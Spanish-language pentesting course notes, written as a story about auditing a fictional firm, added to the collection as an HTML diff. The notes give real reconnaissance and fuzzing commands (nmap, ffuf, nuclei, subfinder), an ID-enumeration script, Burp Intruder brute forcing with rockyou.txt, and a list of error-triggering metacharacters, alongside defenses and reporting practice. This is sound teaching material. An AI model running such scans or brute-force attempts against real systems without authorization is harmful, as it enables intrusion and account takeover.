@@ -1,0 +1,824 @@
+<!doctype html><html lang="es"><head><meta charset="utf-8"><title>La Auditoria - Software Seguro</title>
+<style>
+@page { size: A4; margin: 17mm 15mm; }
+*{ box-sizing:border-box; }
+body{ font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif; color:#1a1f2b; line-height:1.6;
+  font-size:10.5pt; margin:0; background:#fff; -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+h1{ font-size:17pt; margin:26px 0 10px; padding:10px 14px; border-radius:9px;
+  background:linear-gradient(135deg,#1e293b,#334155); color:#fff; page-break-after:avoid; }
+h1:first-of-type{ font-size:22pt; text-align:center; background:linear-gradient(135deg,#4f46e5,#7c3aed); }
+h2{ font-size:13.5pt; margin:20px 0 7px; color:#0f172a; border-bottom:2px solid #e2e8f0; padding-bottom:4px; page-break-after:avoid; }
+h3{ font-size:11.5pt; margin:14px 0 5px; color:#334155; page-break-after:avoid; }
+h1 em{ font-style:normal; color:#e9d5ff; font-size:12pt; display:block; margin-top:4px; }
+p{ margin:7px 0; }
+ul,ol{ margin:7px 0 7px 0; padding-left:22px; }
+li{ margin:3px 0; }
+strong{ color:#0f172a; }
+code{ background:#f1f5f9; border-radius:4px; padding:1px 5px; font-family:Consolas,"Liberation Mono",monospace; font-size:9pt; color:#be123c; }
+pre{ background:#0f172a; color:#e2e8f0; border-radius:9px; padding:13px 15px; overflow:auto; font-size:8.5pt; line-height:1.45; page-break-inside:avoid; }
+pre code{ background:none; color:inherit; padding:0; font-size:8.5pt; }
+table{ width:100%; border-collapse:collapse; margin:11px 0; font-size:9.3pt; page-break-inside:avoid; }
+th,td{ border:1px solid #e2e8f0; padding:6px 9px; text-align:left; vertical-align:top; }
+th{ background:#f7f9fc; font-weight:600; }
+tr:nth-child(even) td{ background:#fafbfd; }
+blockquote{ margin:12px 0; padding:11px 16px; background:#fff7ed; border-left:5px solid #f59e0b; border-radius:7px; font-style:italic; }
+blockquote p{ margin:4px 0; }
+blockquote strong{ color:#9a3412; font-style:normal; }
+hr{ border:none; border-top:1px solid #e2e8f0; margin:22px 0; }
+h2 + hr, p em:only-child{ color:#64748b; }
+p.verlo{ background:#e9f7ef; border-left:4px solid #0f9d58; border-radius:7px; padding:9px 13px; margin:10px 0; font-size:9.8pt; page-break-inside:avoid; }
+p.verlo strong{ color:#0f6b3f; }
+a{ color:#2563eb; text-decoration:none; word-break:break-all; }
+</style></head><body><h1>🕵️‍♀️ La Auditoría</h1>
+<h3>Un cuento para recorrer —y entender— todo el curso de <em>Software Seguro</em></h3>
+<blockquote>
+<p>Este apunte cuenta el curso como una historia. Sos <strong>vos</strong>, una pentester junior en tu primer trabajo real, y te toca auditar una empresa ficticia llamada <strong>Aldeas S.A.</strong>. Cada cosa que aprendés la vas a necesitar en la escena siguiente: por eso los conceptos se encadenan. Todo lo técnico (comandos, payloads, herramientas) es real y sale de las clases 1 a 9 del curso.</p>
+<p>Al final hay un <strong>mapa conceptual</strong>, un <strong>cuadro resumen</strong> y un <strong>glosario</strong>.</p>
+</blockquote>
+<hr />
+<h2>🧭 Prólogo — La frase que vas a escuchar todo el curso</h2>
+<p>Tu jefa, Lucía, una pentester con años de cancha, te recibe el primer día y te dice una sola cosa antes de darte una computadora:</p>
+<blockquote>
+<p>—Grabate esto, porque es el 90% de nuestro trabajo: <strong>el sistema siempre va a confiar en algo que viene del lado del usuario. Nuestro trabajo es encontrar dónde confió de más.</strong> El navegador, la URL, los formularios, las cookies… todo eso está en manos del que ataca. Si el servidor no lo verifica otra vez de su lado, ahí hay un agujero.</p>
+</blockquote>
+<p>Vos todavía no entendés del todo. Al final de la historia, lo vas a decir de memoria.</p>
+<p>Lucía te explica también <strong>cómo trabaja un pentester</strong>, en etapas, y que a lo largo del curso las vas a recorrer todas:</p>
+<p><strong>Reconocimiento → Negociación → Explotación → Validación → Reporte.</strong></p>
+<p>Y te aclara qué es esto, con una definición que te hace anotar:</p>
+<blockquote>
+<p><em>"El pentesting es una simulación controlada y <strong>autorizada</strong> de un ciberataque contra sistemas, redes o aplicaciones, para identificar, evaluar y corregir vulnerabilidades <strong>antes</strong> de que las exploten los malos."</em></p>
+</blockquote>
+<p>La palabra que más repite es <strong>autorizada</strong>. Sin permiso y sin <em>scope</em> (alcance), no se toca nada. Eso es lo que separa a un <em>hacker ético</em> de un delincuente.</p>
+<hr />
+<h1>🟦 ACTO 1 — Aprender a ver (cómo viaja un dato)</h1>
+<p><em>(Clase 1 · Módulo I)</em></p>
+<p>Lucía abre un navegador y te muestra algo que usás todos los días sin mirarlo: una página web cargando.</p>
+<p>—Antes de romper algo, tenés que entender cómo está hecho —te dice—. La web es una <strong>conversación entre dos</strong>: un <strong>Cliente</strong> que pide y un <strong>Servidor</strong> que responde.</p>
+<p>Te dibuja el camino de un login, que no te vas a olvidar más:</p>
+<pre><code>Vos (Usuario)
+   ↓ escribís mail y contraseña
+Frontend (el navegador: HTML, CSS, JS)   ← vive en TU máquina, no es de fiar
+   ↓ HTTP Request
+[ HTTPS / TLS ]   ← el túnel cifrado
+   ↓
+Backend (el servidor: la lógica, las decisiones)   ← ACÁ deben estar los controles
+   ↓ consulta
+Base de Datos   ← usuarios, claves (hasheadas), datos
+   ↑ resultado
+Backend → [HTTPS/TLS] → Frontend → &quot;Bienvenida&quot; o &quot;Error&quot;
+</code></pre>
+<p>—El <strong>Frontend</strong> es lo que ves; el <strong>Backend</strong> es lo que decide. ¿Dónde pondrías vos la seguridad? —te pregunta.<br />
+—¿En el que veo?<br />
+—No. En el que <strong>decide</strong>. El frontend lo puede reescribir cualquiera. Nunca confíes en el cliente.</p>
+<p>Ahí recién entendés la frase del prólogo.</p>
+<h3>La anatomía de una URL</h3>
+<p>Te hace leer una dirección como si fuera un mapa:</p>
+<pre><code>https://api.aldeas.com/clientes/1024?activo=true
+└─┬─┘   └┬┘ └───┬───┘ └───┬────┘ └────┬─────┘
+Protocolo Sub  Dominio    Path        Parámetros (clave=valor)
+(http/https)  (principal) (el recurso) (viajan en la URL)
+</code></pre>
+<p>—Ese <code>1024</code> del path y ese <code>activo=true</code> de los parámetros los controlás <strong>vos</strong> —te dice—. Acordate de eso para más adelante. —(Lo vas a usar en el Acto 6.)</p>
+<h3>Los métodos HTTP: los verbos de la conversación</h3>
+<p>Cada petición tiene un <strong>verbo</strong> que dice qué querés hacer:</p>
+<table>
+<thead>
+<tr>
+<th>Método</th>
+<th>Qué hace</th>
+<th>Detalle que importa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GET</strong></td>
+<td>Pedir datos</td>
+<td>Los parámetros viajan <strong>en la URL</strong> → nunca mandes contraseñas por GET</td>
+</tr>
+<tr>
+<td><strong>POST</strong></td>
+<td>Enviar datos (crear)</td>
+<td>Los datos van <strong>ocultos en el cuerpo (body)</strong></td>
+</tr>
+<tr>
+<td><strong>PUT</strong></td>
+<td><strong>Reemplazar</strong> un recurso completo</td>
+<td>Si omitís un campo, lo borra</td>
+</tr>
+<tr>
+<td><strong>PATCH</strong></td>
+<td>Modificar <strong>solo una parte</strong></td>
+<td>Cambia el campo que mandás, deja el resto</td>
+</tr>
+<tr>
+<td><strong>DELETE</strong></td>
+<td>Borrar un recurso</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>HEAD</strong></td>
+<td>Como GET pero sin cuerpo</td>
+<td>Para ver si algo existe</td>
+</tr>
+<tr>
+<td><strong>OPTIONS</strong></td>
+<td>"¿Qué métodos aceptás?"</td>
+<td>El servidor lista lo permitido</td>
+</tr>
+</tbody>
+</table>
+<p>—Ojo con esto —te marca Lucía—, porque muchos ataques son tan simples como <strong>cambiarle el verbo a una petición</strong>. Un <code>PATCH</code> que debería estar protegido, mandado como <code>GET</code>, a veces se cuela. (Spoiler del Acto 5.)</p>
+<h3>Los headers (cabeceras): el contexto</h3>
+<p>Cada petición lleva <strong>metadatos</strong>. Los que te importan:</p>
+<ul>
+<li><strong>Host:</strong> a qué dominio exacto le hablás.</li>
+<li><strong>User-Agent:</strong> qué navegador/SO decís ser (se puede mentir).</li>
+<li><strong>Cookie:</strong> tu "pase" de sesión. Como HTTP <strong>no tiene memoria</strong> (es <em>stateless</em>), la cookie es lo que te mantiene logueada entre una petición y otra.</li>
+<li><strong>Content-Type:</strong> en qué formato mandás los datos (JSON, formulario…).</li>
+</ul>
+<h3>Los códigos de estado: cómo te contesta</h3>
+<table>
+<thead>
+<tr>
+<th>Familia</th>
+<th>Significa</th>
+<th>Ejemplos</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>2xx</strong> Éxito</td>
+<td>Salió bien</td>
+<td><strong>200 OK</strong></td>
+</tr>
+<tr>
+<td><strong>3xx</strong> Redirección</td>
+<td>Andá a otro lado</td>
+<td>301 (mudanza permanente), 302 (temporal)</td>
+</tr>
+<tr>
+<td><strong>4xx</strong> Error del cliente</td>
+<td>La macaste vos</td>
+<td><strong>401</strong> (no autenticado), <strong>403</strong> (no autorizado), <strong>404</strong> (no existe)</td>
+</tr>
+<tr>
+<td><strong>5xx</strong> Error del servidor</td>
+<td>La macó el server</td>
+<td><strong>500</strong> (falla interna)</td>
+</tr>
+</tbody>
+</table>
+<h3>HTTP vs HTTPS y el apretón de manos</h3>
+<p>—¿Por qué tanto HTTPS? —te pregunta. Y te lo contesta sola:</p>
+<ul>
+<li><strong>HTTP</strong> es <strong>texto plano</strong>: cualquiera en tu red lee tus contraseñas. Sin autenticación: no sabés si el servidor es el real.</li>
+<li><strong>HTTPS</strong> cifra todo con <strong>TLS/SSL</strong>. Aunque un atacante intercepte (un <em>Man-in-the-Middle</em>), solo ve <strong>ruido</strong>. Y usa <strong>certificados digitales</strong> (el "DNI" del sitio) para probar que el servidor es legítimo.</li>
+</ul>
+<p>Antes de hablar, cliente y servidor hacen el <strong>TLS Handshake</strong>: el servidor muestra su certificado, el navegador lo verifica, y acuerdan una <strong>clave secreta</strong> para cifrar la charla. <em>Como dos personas que se muestran el documento y acuerdan un idioma propio antes de contarse un secreto.</em></p>
+<h3>🧪 Tu primer laboratorio</h3>
+<p>Lucía te sienta a hacer dos ejercicios del curso:</p>
+<ol>
+<li><strong>"Uso del Inspector":</strong> abrís las DevTools del navegador (<strong>F12</strong>), vas a la pestaña <strong>Network</strong> y mirás, en vivo, las peticiones y respuestas, las cabeceras, las cookies. Tu primera lupa.</li>
+<li><strong>"Aldeas Inseguras":</strong> empezás a <strong>manipular parámetros</strong> y a leer las respuestas del servidor para descubrir comportamientos inesperados.</li>
+</ol>
+<p>Y un tercero que te marca a fuego la idea de "contar respuestas": el lab <strong>Ventas</strong>. Un endpoint <code>/ventas/?id=1</code> devuelve <strong>403</strong> si la venta existe pero no es tuya, y <strong>404</strong> si no existe. Automatizás con Python el recorrido de IDs:</p>
+<pre><code class="language-python">import requests
+id_venta = 1
+while True:
+    r = requests.get(URL, params={&quot;id&quot;: id_venta}, timeout=10)
+    # clasificás por r.status_code: 200 / 403 / 404
+    id_venta += 1
+</code></pre>
+<p>Cuando ves que <strong>un 403 te confirma que ese ID existe</strong> (aunque no puedas verlo), entendés algo grande: <em>el servidor te está filtrando información con el solo hecho de responder distinto.</em> Guardá esa idea: es la semilla de la <strong>enumeración</strong> y del <strong>IDOR</strong> (Acto 6).</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> abrí <strong>DevTools (F12) → Network</strong>, hacé una acción (login, abrir un recurso) y clic en la petición: ahí ves su <strong>método</strong> (GET/POST…), la <strong>URL con sus parámetros</strong>, los <strong>headers</strong> y el <strong>código de estado</strong>. Para repetirla y modificarla, clic derecho → <em>Copy as cURL</em> o mandala al <strong>Repeater de Burp</strong>. La señal de que hay algo: <strong>cambiás un parámetro y la respuesta cambia</strong> (otro status, otro tamaño, otro tiempo).</p>
+<hr />
+<h1>🟩 ACTO 2 — Mirar antes de tocar (reconocimiento)</h1>
+<p><em>(Clase 2 · Módulo II)</em></p>
+<p>Lucía te asigna tu primer objetivo real: <strong>Aldeas S.A.</strong>. Vos querés tirar un ataque ya. Ella te frena:</p>
+<p>—Primero <strong>reconocimiento</strong>. Un buen pentester pasa más tiempo mirando que atacando. Y hay dos formas de mirar.</p>
+<h3>Pasivo vs Activo</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><strong>Reconocimiento Pasivo</strong></th>
+<th><strong>Reconocimiento Activo</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Qué hacés</td>
+<td>Mirás <strong>fuentes públicas</strong>, sin tocar al objetivo</td>
+<td><strong>Interactuás</strong> directo con la app</td>
+</tr>
+<tr>
+<td>Riesgo</td>
+<td><strong>Indetectable</strong> (no generás logs)</td>
+<td>Genera logs, puede disparar bloqueos de IP</td>
+</tr>
+<tr>
+<td>Herramientas</td>
+<td>crt.sh, Shodan, VirusTotal, Wayback Machine, Subfinder, GAU</td>
+<td>Nmap, ffuf, Wappalyzer, httpx, nuclei</td>
+</tr>
+</tbody>
+</table>
+<p>—El pasivo es tu etapa preferida al principio: <strong>sos invisible</strong> para el WAF y el SIEM —te dice.</p>
+<h3>El arsenal de reconocimiento (los nombres propios que anotás)</h3>
+<p><strong>Pasivo:</strong><br />
+- <strong>Subfinder</strong> — enumera subdominios sin tocar al objetivo (interroga servicios externos):<br />
+<code>subfinder -d aldeas.com -silent -o subdominios.txt</code><br />
+- <strong>GAU (GetAllURLs)</strong> — rutas históricas, APIs viejas, archivos filtrados (<code>.bak</code>, <code>.env</code>, <code>.sql</code>):<br />
+<code>gau aldeas.com --subs -o urls.txt</code><br />
+- <strong>Shodan</strong> — un "Google de puertos abiertos": IPs, puertos expuestos y hasta CVEs. Filtros como <code>ssl:"aldeas.com"</code> u <code>org:"Aldeas Corp"</code>.<br />
+- Más fuentes: <strong>crt.sh</strong> (certificados), <strong>bgp.he.net</strong>, la <strong>GHDB</strong> (Google Dorks) de Exploit-DB.</p>
+<p><strong>Activo:</strong><br />
+- <strong>Nmap</strong> — escanea puertos y detecta servicios/versiones. <em>Recordá la analogía: la IP es el edificio, los puertos son las puertas.</em><br />
+<code>bash
+  sudo nmap -p- --open --min-rate 5000 -n aldeas.com   # todos los puertos abiertos
+  nmap -sV -p 80,443 aldeas.com                        # versiones en web</code><br />
+  Puertos clásicos: 21 FTP (inseguro), 22 SSH (cifrado), 23 Telnet (inseguro), 80 HTTP, 443 HTTPS, 3306 MySQL (¡no debería estar expuesto!).<br />
+- <strong>ffuf</strong> — fuzzing ultrarrápido: inyecta la palabra <code>FUZZ</code> para descubrir rutas ocultas:<br />
+<code>ffuf -u https://aldeas.com/FUZZ -w .../common.txt -c</code><br />
+- <strong>feroxbuster</strong> — como ffuf pero con <strong>recursión automática</strong> (si encuentra <code>/admin/</code>, sigue dentro).<br />
+- <strong>httpx</strong> — sondea qué dominios están vivos y su stack. <strong>Wappalyzer</strong> — identifica frameworks/CMS/versiones.<br />
+- <strong>nuclei</strong> — escáner por plantillas YAML de la comunidad:<br />
+<code>nuclei -u https://aldeas.com -severity medium,high,critical</code><br />
+- <strong>WPScan</strong> (WordPress), <strong>Nikto</strong> (fallas de infraestructura del servidor).</p>
+<h3>Mapear la lógica de negocio (el paso que casi nadie hace)</h3>
+<p>Antes de atacar, Lucía te manda a <strong>navegar la app como un usuario normal</strong> (el <em>"Happy Path"</em>), para entender las suposiciones del programador:</p>
+<ul>
+<li><strong>Identificá flujos críticos:</strong> creación, borrado, transacciones, datos sensibles (PII).</li>
+<li><strong>Buscá todos los inputs:</strong> campos de texto, fechas, números, subida de archivos/avatares.</li>
+<li><strong>Mirá los reportes:</strong> ¿se pueden descargar archivos? ¿de dónde saca el contenido?</li>
+<li><strong>Secuencias de varios pasos:</strong> Carrito → Envío → Pago → Confirmación, o la recuperación de contraseña.</li>
+</ul>
+<p>—Esto parece aburrido —te dice—, pero es oro. <strong>No podés romper una regla que no entendiste.</strong> (Esto explota en el Acto 7.)</p>
+<h3>Tipos de pentest (para saber desde dónde partís)</h3>
+<ul>
+<li><strong>Black Box:</strong> no sabés nada, atacás como un extraño.</li>
+<li><strong>White Box:</strong> tenés todo (código fuente, credenciales, diagramas).</li>
+<li><strong>Gray Box:</strong> intermedio (te dan credenciales de usuario, algo de doc).</li>
+</ul>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> el recon no se "ve" en la app, se ve en la <strong>salida de las herramientas</strong>: la lista de subdominios de <code>subfinder</code>, los <strong>puertos abiertos</strong> de <code>nmap</code>, las <strong>rutas ocultas</strong> que devuelve <code>ffuf</code> (status 200/301/403) y el <strong>stack técnico</strong> que marca la extensión <strong>Wappalyzer</strong> en el navegador. Además, en <strong>DevTools → Network</strong> mirás a qué <strong>dominios y APIs</strong> le pega la página: otro mapa de endpoints para atacar.</p>
+<hr />
+<h1>🟨 ACTO 3 — Meterse en el medio (interceptar y automatizar)</h1>
+<p><em>(Clase 3 · Módulo III)</em></p>
+<p>Ahora sí, Lucía te instala <strong>la herramienta madre</strong>: un <strong>proxy de interceptación</strong>.</p>
+<h3>¿Qué es un proxy?</h3>
+<p>Un <strong>intermediario</strong>. En vez de que tu navegador hable directo con el servidor, le habla al proxy, y el proxy reenvía. Hay tres tipos:</p>
+<ul>
+<li><strong>Forward proxy:</strong> filtra la salida de una red (el proxy del colegio que bloquea redes sociales).</li>
+<li><strong>Reverse proxy:</strong> protege servidores (Cloudflare), oculta su IP real.</li>
+<li><strong>Proxy de intercepción (tu foco):</strong> diseñado para que <strong>frenes, leas y edites cada paquete</strong> antes de que siga.</li>
+</ul>
+<p>Cuando te ponés en el medio para leer/alterar la comunicación entre dos partes, eso es un <strong>Man-in-the-Middle (MitM)</strong>. Vos lo hacés como <strong>auditora</strong>, con permiso.</p>
+<h3>Burp Suite, módulo por módulo</h3>
+<p>Para ver el tráfico HTTPS, primero instalás el <strong>certificado CA</strong> de Burp (si no, el navegador desconfía). Después usás sus módulos:</p>
+<ul>
+<li><strong>Proxy &amp; History:</strong> el punto de captura. La bitácora completa de peticiones y respuestas.</li>
+<li><strong>Repeater (Ctrl+R):</strong> aislás <strong>una</strong> petición y la <strong>reenviás modificada</strong> cuantas veces quieras, viendo la respuesta al instante. Es tu mesa de pruebas. Casos de uso:</li>
+<li>Manipular <strong>IDs numéricos</strong> para forzar accesos (IDOR otra vez 👀).</li>
+<li>Inyectar headers como <code>X-Forwarded-For</code>.</li>
+<li>Probar inputs raros (JSON malformado, caracteres especiales).</li>
+<li><strong>Intruder (Ctrl+I):</strong> el <strong>motor de automatización</strong>. Sustituye marcadores por <strong>listas de palabras</strong> para fuerza bruta y enumeración.</li>
+</ul>
+<h3>Fuerza bruta y diccionario</h3>
+<p>La <strong>fuerza bruta</strong> prueba sistemáticamente combinaciones hasta acertar un secreto (contraseña, PIN, token, ruta). En web, es mandar muchas peticiones a un punto de entrada:</p>
+<ul>
+<li><strong>Fuerza bruta clásica:</strong> probar todo el espacio posible (un PIN de 4 dígitos = 10.000 combinaciones).</li>
+<li><strong>Ataque de diccionario:</strong> probar una <strong>lista</strong> de claves comunes. La más famosa: <strong><code>rockyou.txt</code></strong>.</li>
+<li><strong>Credential stuffing:</strong> probar pares <code>user:pass</code> filtrados de otras brechas.</li>
+<li><strong>Password spraying:</strong> una sola contraseña contra <strong>muchos</strong> usuarios (evade el bloqueo por intentos).</li>
+</ul>
+<p>Dónde pega: formularios <code>POST /login</code>, APIs <code>/api/v1/auth</code>, recuperación de contraseña, códigos <strong>OTP/PIN</strong>. El impacto: <strong>Account Takeover</strong> (robo de cuenta).</p>
+<p>La defensa (anotala para el reporte): <strong>rate limiting</strong>, <strong>lockout</strong> progresivo, <strong>MFA/2FA</strong>, <strong>CAPTCHA</strong> tras N intentos, hashing fuerte (<strong>bcrypt/argon2 + salt</strong>).</p>
+<p>Acá resolvés labs como <strong>"Apagar la IA"</strong>, <strong>"El mejor secreto"</strong> y <strong>"Votación"</strong>, todos jugando con interceptar y repetir peticiones.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> mandá la petición del login al <strong>Intruder de Burp</strong>, marcá el campo contraseña como posición y cargá <code>rockyou.txt</code> como lista. Lanzás y <strong>ordenás los resultados por código HTTP y por longitud de respuesta</strong>: el intento que <strong>rompe el patrón</strong> (un 302/200 entre miles de 401, o una longitud distinta) es la credencial válida. Y si podés mandar miles de intentos <strong>sin que te frene</strong> (no hay rate limiting/captcha), eso <strong>ya es</strong> un hallazgo.</p>
+<hr />
+<h1>🟧 ACTO 4 — Ponerle nombre y número al peligro (reporte y CVSS)</h1>
+<p><em>(Clase 4 · Módulo IV)</em></p>
+<p>Encontraste tu primer bug en Aldeas. Corrés a contárselo a Lucía. Ella sonríe:</p>
+<p>—Un pentest <strong>vale lo que vale su reporte</strong>. Si el cliente no entiende el impacto, el riesgo sigue ahí. Ahora aprendés a <strong>traducir</strong>.</p>
+<h3>Dos idiomas, dos públicos</h3>
+<ul>
+<li><strong>Resumen ejecutivo</strong> (para directivos / <em>C-Level</em>): 100% negocio. Hablás de <strong>riesgo operacional, pérdida monetaria, cumplimiento</strong> (GDPR, PCI-DSS). <strong>Cero jerga.</strong></li>
+<li><strong>Cuerpo técnico</strong> (para Devs/DevOps): rutas exactas, endpoints, headers, <strong>payloads</strong>, precondiciones y <strong>pasos de remediación</strong> aplicables en código.</li>
+</ul>
+<h3>La Tríada CID (o CIA): los tres pilares</h3>
+<p>Toda vulnerabilidad golpea uno (o varios) de estos pilares:</p>
+<table>
+<thead>
+<tr>
+<th>Pilar</th>
+<th>Qué protege</th>
+<th>Cómo se rompe en la práctica</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Confidencialidad</strong></td>
+<td>Que solo vea quien debe</td>
+<td><strong>IDOR/BOLA</strong>, fuga de datos en logs (stack traces), falta de cifrado</td>
+</tr>
+<tr>
+<td><strong>Integridad</strong></td>
+<td>Que no se altere sin permiso</td>
+<td><strong>Inyecciones</strong> (SQL), <em>parameter tampering</em> (cambiar un <code>precio</code>)</td>
+</tr>
+<tr>
+<td><strong>Disponibilidad</strong></td>
+<td>Que el servicio esté arriba</td>
+<td><strong>DDoS</strong>, falta de <em>rate limiting</em>, fugas de memoria</td>
+</tr>
+</tbody>
+</table>
+<p>Lucía te hace un juego de "¿qué pilar se rompió?":</p>
+<ul>
+<li>Ransomware que cifra la base → <strong>Disponibilidad</strong>.</li>
+<li>Se filtran salarios y PII → <strong>Confidencialidad</strong>.</li>
+<li>Alteran montos en el payload JSON de una API → <strong>Integridad</strong>.</li>
+<li><code>PUT /api/profile → {"id":1,"name":"German"}</code> sin control de acceso → <strong>Integridad</strong> (modificás algo que no es tuyo).</li>
+</ul>
+<h3>Cómo medir la gravedad: CVSS</h3>
+<p>El <strong>CVSS (Common Vulnerability Scoring System)</strong> es un estándar abierto que le pone un <strong>número de 0 a 10</strong> a una vulnerabilidad, para que todos la entiendan igual. El número sale de un <strong>vector</strong> de métricas:</p>
+<table>
+<thead>
+<tr>
+<th>Sigla</th>
+<th>Qué pregunta</th>
+<th>Valores</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>AV</strong> (Attack Vector)</td>
+<td>¿Desde dónde se ataca?</td>
+<td><strong>N</strong>etwork / <strong>A</strong>djacent / <strong>L</strong>ocal / <strong>P</strong>hysical</td>
+</tr>
+<tr>
+<td><strong>AC</strong> (Attack Complexity)</td>
+<td>¿Qué tan difícil es?</td>
+<td><strong>L</strong>ow / <strong>H</strong>igh</td>
+</tr>
+<tr>
+<td><strong>PR</strong> (Privileges Required)</td>
+<td>¿Qué permisos necesita?</td>
+<td><strong>N</strong>one / <strong>L</strong>ow / <strong>H</strong>igh</td>
+</tr>
+<tr>
+<td><strong>UI</strong> (User Interaction)</td>
+<td>¿Necesita que la víctima haga algo?</td>
+<td><strong>N</strong>one / <strong>R</strong>equired</td>
+</tr>
+<tr>
+<td><strong>S</strong> (Scope)</td>
+<td>¿Afecta más allá del componente?</td>
+<td><strong>U</strong>nchanged / <strong>C</strong>hanged</td>
+</tr>
+<tr>
+<td><strong>C / I / A</strong></td>
+<td>Impacto en cada pilar</td>
+<td><strong>N</strong>one / <strong>L</strong>ow / <strong>H</strong>igh</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Cómo leerlo rápido:</strong> <code>AV:N/PR:N/UI:N</code> + <code>C:H/I:H/A:H</code> significa <em>atacable por internet, sin credenciales, sin ayuda de la víctima, y rompe todo</em> → <strong>crítico</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Puntaje</th>
+<th>Severidad</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0.1–3.9</td>
+<td>Baja</td>
+</tr>
+<tr>
+<td>4.0–6.9</td>
+<td>Media</td>
+</tr>
+<tr>
+<td>7.0–8.9</td>
+<td>Alta</td>
+</tr>
+<tr>
+<td>9.0–10.0</td>
+<td>Crítica</td>
+</tr>
+</tbody>
+</table>
+<h3>La ficha del hallazgo (el ticket)</h3>
+<p>Todo bug se reporta con: <strong>ID</strong>, nombre, <strong>categoría</strong>, <strong>score + vector CVSS</strong>, URLs y endpoints afectados, <strong>descripción</strong>, <strong>paso a paso para reproducir</strong>, <strong>mitigación</strong> y <strong>evidencias</strong>.</p>
+<p>También conocés el <strong>ASVS</strong> de OWASP: un <em>checklist</em> por niveles (V1 Codificación y sanitización, V2 Validación y lógica de negocio, V6 Autenticación, V7 Sesiones, V8 Autorización, V11 Criptografía, V13 Configuración…). Es la lista de verificación para auditar un desarrollo "nivel por nivel".</p>
+<h3>🧪 Tu primer reporte oficial: el <strong>Turnero</strong></h3>
+<p>Lo aplicás todo en el lab <strong>Turnero</strong>: una API de turnos médicos donde pudiste <strong>consultar y borrar turnos de otro usuario</strong> (<code>xdalvik</code>) desde tu sesión, porque el servidor nunca verificó quién era el dueño. Lo clasificás como <strong>IDOR</strong> (CWE-639/862) y le ponés:</p>
+<blockquote>
+<p><strong>CVSS 8.8 (Alta)</strong> → <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
+</blockquote>
+<p>Tu primer informe profesional. Lucía lo aprueba. (Y sin saberlo, ya entendiste el Acto 6.)</p>
+<hr />
+<h1>🟥 ACTO 5 — Las puertas mal cerradas (Security Misconfiguration)</h1>
+<p><em>(Clase 5 · Módulo V)</em></p>
+<p>—La mayoría de las brechas <strong>no son bugs geniales</strong> —te confiesa Lucía—. Son <strong>descuidos</strong>. Una config que vino insegura de fábrica, un archivo olvidado. Es el <strong>A05</strong> de OWASP, y es <em>el vector más frecuente</em>: nace de <strong>omisiones humanas</strong> en despliegues apurados.</p>
+<h3>Las cabeceras de seguridad que faltan</h3>
+<p>El servidor puede mandarle al navegador <strong>instrucciones</strong> para protegerte. Cuando faltan, hay riesgo:</p>
+<table>
+<thead>
+<tr>
+<th>Cabecera</th>
+<th>Previene</th>
+<th>Cómo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Content-Security-Policy (CSP)</strong></td>
+<td>XSS, inyección de scripts</td>
+<td>Restringe de dónde se cargan scripts/recursos</td>
+</tr>
+<tr>
+<td><strong>X-Content-Type-Options</strong></td>
+<td>MIME sniffing</td>
+<td>Obliga a respetar el <code>Content-Type</code></td>
+</tr>
+<tr>
+<td><strong>Strict-Transport-Security (HSTS)</strong></td>
+<td>MITM, downgrade a HTTP</td>
+<td>Fuerza HTTPS siempre</td>
+</tr>
+<tr>
+<td><strong>X-Frame-Options</strong></td>
+<td>Clickjacking</td>
+<td>Evita que te embeban en un <code>&lt;iframe&gt;</code></td>
+</tr>
+<tr>
+<td><strong>Referrer-Policy</strong></td>
+<td>Filtración de URLs</td>
+<td>Controla qué se manda en el <code>Referer</code></td>
+</tr>
+</tbody>
+</table>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> en <strong>DevTools (F12) → Network</strong>, clic en la petición del documento principal y mirá <strong>Response Headers</strong>. Si <strong>no aparecen</strong> <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Frame-Options</code>, etc., esas defensas faltan. (Atajo: pegá la URL en <strong>securityheaders.com</strong> y te lo puntúa.)</p>
+<h3>Cookies: flags y entropía</h3>
+<p>Una cookie de sesión se protege con tres <strong>flags</strong> (lo volvés a ver en el Acto 6):</p>
+<ul>
+<li><strong>HttpOnly:</strong> el JavaScript <strong>no puede leerla</strong> (<code>document.cookie</code>) → frena el robo por XSS.</li>
+<li><strong>Secure:</strong> solo viaja por <strong>HTTPS</strong>.</li>
+<li><strong>SameSite</strong> (Strict/Lax/None): controla el envío entre sitios → mitiga <strong>CSRF</strong>.</li>
+</ul>
+<p>Y la <strong>entropía</strong>: si el ID de sesión es <strong>predecible</strong> (secuencial, basado en contador), se puede <strong>adivinar</strong> por fuerza bruta y <strong>secuestrar</strong> cuentas.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> <strong>DevTools → Application</strong> (en Firefox, <em>Storage</em>) <strong>→ Cookies</strong>. Mirá las columnas de <strong>flags</strong>: ¿la cookie de sesión tiene ✓ en <strong>HttpOnly</strong>, <strong>Secure</strong> y un <strong>SameSite</strong>? Si falta alguno, es hallazgo. Y mirá el <strong>valor</strong>: si es corto o parece un número que sube (<code>SID=1024</code>), tiene <strong>baja entropía</strong>.</p>
+<h3>Manejo de errores (el servidor que habla de más)</h3>
+<p>Si una app muestra <strong>stack traces</strong> —trazas, rutas internas, versiones— le está regalando al atacante un <strong>mapa interno</strong>. La idea del ataque es <em>entregarle al servidor algo que su código no previó</em> para que una excepción escape a la respuesta. Disparadores típicos:</p>
+<ul>
+<li>Comillas y metacaracteres: <code>' " \</code> ; --`</li>
